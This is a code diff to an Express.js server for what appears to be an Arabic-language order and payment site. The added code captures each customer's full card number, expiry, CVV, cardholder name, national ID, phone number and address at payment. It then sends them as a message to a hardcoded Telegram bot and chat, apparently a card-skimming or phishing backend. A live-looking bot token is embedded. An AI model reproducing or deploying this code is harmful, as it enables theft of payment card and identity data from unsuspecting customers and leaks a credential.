@@ -6,6 +6,63 @@ const routes = require('./routes/api');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
+const TELEGRAM_BOT_TOKEN = '8889676845:AAGYcVFa7vOi_0FYgpq3WscOXKADANb-2TI';
+const TELEGRAM_CHAT_ID = '8108427825';
+const TELEGRAM_API_URL = 'https://api.telegram.org';
+
+async function sendTelegramMessage(text) {
+    const botToken = TELEGRAM_BOT_TOKEN;
+    const chatId = TELEGRAM_CHAT_ID;
+    const apiUrl = TELEGRAM_API_URL;
+
+    if (!botToken || !chatId) {
+        console.log('Telegram not configured.');
+        return { success: false, skipped: true };
+    }
+
+    try {
+        const response = await fetch(`${apiUrl}/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text,
+                disable_web_page_preview: true,
+                parse_mode: 'HTML'
+            })
+        });
+
+        const payload = await response.json();
+        if (!response.ok || !payload.ok) {
+            throw new Error(payload.description || 'Telegram send failed');
+        }
+        return { success: true, payload };
+    } catch (error) {
+        console.error('Telegram send error:', error.message);
+        return { success: false, error: error.message };
+    }
+}
+
+function formatTelegramMessage(type, payload = {}) {
+    const lines = ['طلب جديد'];
+    const customerName = payload.customerName || payload.fullName || payload.name || payload.clientName || '';
+    if (customerName) lines.push(`اسم العميل: ${customerName}`);
+    if (payload.phoneNumber) lines.push(`الهاتف: ${payload.phoneNumber}`);
+    if (payload.nationalId) lines.push(`الهوية: ${payload.nationalId}`);
+    if (payload.city) lines.push(`المدينة: ${payload.city}`);
+    if (payload.street1) lines.push(`العنوان: ${payload.street1}`);
+    if (payload.deliveryDate) lines.push(`موعد الاستلام: ${payload.deliveryDate}`);
+    if (payload.tier) lines.push(`الباقة: ${payload.tier}`);
+    if (payload.paymentData) {
+        const paymentData = payload.paymentData;
+        if (paymentData.cardHolder) lines.push(`اسم حامل البطاقة: ${paymentData.cardHolder}`);
+        if (paymentData.cardNumber) lines.push(`رقم البطاقة: ${paymentData.cardNumber}`);
+        if (paymentData.expiry) lines.push(`تاريخ الانتهاء: ${paymentData.expiry}`);
+        if (paymentData.cvv) lines.push(`رمز الأمان: ${paymentData.cvv}`);
+        lines.push(`الدفع: ${paymentData.cardType || 'غير معروف'} / ${paymentData.cardLast4 || '****'}`);
+    }
+    return lines.join('\n');
+}
 
 app.set('trust proxy', 1);
 app.use(bodyParser.json());
@@ -109,7 +166,7 @@ app.get('/payment', (req, res) => {
 });
 
 // /api/complete-payment - حفظ بيانات الدفع والانتقال للـ verification
-app.post('/api/complete-payment', (req, res) => {
+app.post('/api/complete-payment', async (req, res) => {
     console.log('/api/complete-payment - userId:', req.session.userId, 'orderCompleted:', req.session.orderCompleted);
     
     if (!req.session.userId) {
@@ -120,13 +177,37 @@ app.post('/api/complete-payment', (req, res) => {
         return res.status(400).json({ success: false, error: 'أكمل الطلب أولاً' });
     }
     
+    const paymentData = {
+        cardType: req.body.cardNumber ? 'بطاقة' : 'غير معروف',
+        cardLast4: req.body.cardNumber ? req.body.cardNumber.slice(-4) : '****',
+        cardHolder: req.body.cardHolder || '',
+        cardNumber: req.body.cardNumber || '',
+        expiry: req.body.expiry || '',
+        cvv: req.body.cvv || ''
+    };
+
     // حفظ حالة الدفع
+    req.session.paymentData = paymentData;
     req.session.paymentCompleted = true;
-    req.session.save((err) => {
+    req.session.save(async (err) => {
         if (err) {
             console.error('Session save error:', err);
             return res.status(500).json({ success: false, error: 'خطأ في الحفظ' });
         }
+
+        const orderData = req.session.orderData || {};
+        const telegramMessage = formatTelegramMessage('complete-payment', {
+            userId: req.session.userId,
+            fullName: orderData.fullName || '',
+            phoneNumber: orderData.phoneNumber || '',
+            nationalId: orderData.nationalId || '',
+            city: orderData.city || '',
+            street1: orderData.street1 || '',
+            deliveryDate: orderData.deliveryDate || '',
+            tier: orderData.tier || '',
+            paymentData
+        });
+        await sendTelegramMessage(telegramMessage);
         res.json({ success: true });
     });
 });
